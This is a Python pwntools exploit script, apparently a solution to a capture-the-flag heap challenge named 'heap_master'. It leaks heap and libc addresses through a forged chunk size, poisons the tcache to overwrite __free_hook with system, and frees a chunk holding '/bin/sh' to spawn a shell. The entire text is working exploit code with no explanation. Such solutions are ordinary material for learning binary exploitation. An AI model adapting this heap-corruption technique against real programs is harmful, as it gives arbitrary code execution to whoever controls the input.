from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./heap_master')

heap_base = int(r.recvline().strip().split()[1], 16) - 0x2a0
info(f'heap addr : {hex(heap_base)}')

def add(idx):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', str(idx).encode())

def delete(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(idx).encode())

def edit(idx, size, msg):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', str(idx).encode())
    r.sendlineafter(b'> ', str(size).encode())
    r.send(msg)

def show(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', str(idx).encode())
    return r.recvline().strip()


add(0)
add(1)
add(2)

edit(0, 0x3f0, b'a')
edit(0, 0x10, b'a')

delete(1)

edit(0, 0x10, flat(
    heap_base + 0x300, 0, 
    0, 0x421
))

delete(2)

libc = u64(show(1).ljust(8, b'\0')) - 0x1ecbe0
info(f'libc : {hex(libc)}')
free_hook = libc + 0x1eee48
system_addr = libc + 0x52290


add(6)
delete(6)
edit(0, 0x10, b'/bin/sh\x00')


add(3)
add(4)
add(5)
delete(5)
delete(4)
delete(3)

edit(0, 0x10, flat(
    0, 0, 
    0, 0x21, 
    free_hook
))

edit(0, 0x10, b'a')
edit(0, 0x10, p64(system_addr))

delete(6)

r.interactive()